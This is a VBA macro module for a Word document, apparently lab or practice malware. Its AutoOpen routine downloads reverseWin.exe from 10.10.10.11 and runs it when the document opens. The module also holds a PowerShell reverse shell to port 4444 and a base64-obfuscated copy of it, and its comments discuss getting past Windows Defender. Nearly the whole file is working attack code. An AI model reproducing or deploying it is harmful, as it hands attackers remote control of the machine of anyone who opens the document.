Attribute VB_Name = "NewMacros"

#If VBA7 Then
    Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
#Else
    Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
#End If


Sub AutoOpen()
'
' AutoRun Macro
'
'

   
   'ReverseShell
   
   ReverseDownload
   'requires kali to host reverse shell
   
   
   'havent got this one to work
   'ObfuscatedReverse
   
   

    
End Sub


Sub ReverseShell()
    'uses netcat but defender catches it
    
    Dim Str As String
    Dim targetIP As String
    Dim targetPort As String

    targetIP = "10.10.10.11" ' <- your listener IP
    targetPort = "4444"        ' <- your listener port
    MsgBox ("HI")
    
    Str = "powershell -nop -w hidden -c ""$client = New-Object System.Net.Sockets.TCPClient('" & targetIP & "'," & targetPort & ");" & _
          "$stream = $client.GetStream();" & _
          "[byte[]]$bytes = 0..65535|%{0};" & _
          "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){" & _
          "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);" & _
          "$sendback = (iex $data 2>&1 | Out-String );" & _
          "$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';" & _
          "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);" & _
          "$stream.Write($sendbyte,0,$sendbyte.Length);" & _
          "$stream.Flush()};" & _
          "$client.Close()"""

    Shell "cmd.exe /c " & Str, vbMinimizedFocus

End Sub
Sub ObfuscatedReverse()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad"
    Str = Str + "AAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdAB"
    Str = Str + "lAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDA"
    Str = Str + "GwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQAwAC4AMQAxACc"
    Str = Str + "ALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAY"
    Str = Str + "wBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwB"
    Str = Str + "bAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuA"
    Str = Str + "C4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACg"
    Str = Str + "AJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJ"
    Str = Str + "ABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATAB"
    Str = Str + "lAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhA"
    Str = Str + "HQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQ"
    Str = Str + "AeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAd"
    Str = Str + "AAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB"
    Str = Str + "0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkA"
    Str = Str + "GkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHg"
    Str = Str + "AIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AU"
    Str = Str + "wB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgA"
    Str = Str + "gAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwBSA"
    Str = Str + "GUAdgBlAHIAcwBlAFMAaABlAGwAbAAjACAAJwA7ACQAcwBlAG4"
    Str = Str + "AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAb"
    Str = Str + "wBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB"
    Str = Str + "5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzA"
    Str = Str + "HQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHk"
    Str = Str + "AdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZ"
    Str = Str + "wB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAA"
    
    Str = Str + "pAH0AJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkAOwA"
    
    'CreateObject("Wscript.Shell").Run Str
    Shell "cmd.exe /c " & Str, vbMinimizedFocus
    
End Sub

'windows defender catches it when the file is created i think
'but it will let you download a txt file

Sub ReverseDownload()
    Dim oXMLHTTP
    Dim oStream
    
    Set oXMLHTTP = CreateObject("MSXML2.XMLHTTP")
    oXMLHTTP.Open "GET", "http://10.10.10.11:80/reverseWin.exe", False
    oXMLHTTP.Send
    
    Dim fileName As String
    fileName = ActiveDocument.Path + "\fileTest.exe"
    
    If oXMLHTTP.Status = 200 Then
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1
        oStream.Write oXMLHTTP.ResponseBody
        oStream.SaveToFile fileName
        oStream.Close
    End If
    Dim Str As String
    
    
    
    
    
    If Dir(fileName) <> "" Then
        'MsgBox ("The file exists")
        Call Shell(fileName, vbMinimizedFocus)
    'Else
        'MsgBox ("the file does not exist")
    End If
End Sub
